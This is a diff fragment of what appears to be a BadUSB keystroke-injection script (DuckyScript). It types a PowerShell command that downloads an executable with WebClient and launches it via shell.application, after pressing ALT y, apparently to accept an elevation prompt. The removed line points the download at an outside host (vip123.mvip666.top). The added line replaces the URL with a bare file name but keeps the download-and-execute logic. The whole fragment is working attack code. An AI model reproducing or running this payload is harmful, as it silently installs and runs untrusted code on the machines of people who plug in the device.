@@ -22,5 +22,5 @@ ENTER
 DELAY 1000
 ALT y
 DELAY 200
-STRING $down = New-Object System.Net.WebClient; $url = 'http://vip123.mvip666.top/abc.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+STRING $down = New-Object System.Net.WebClient; $url = 'abc.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ```
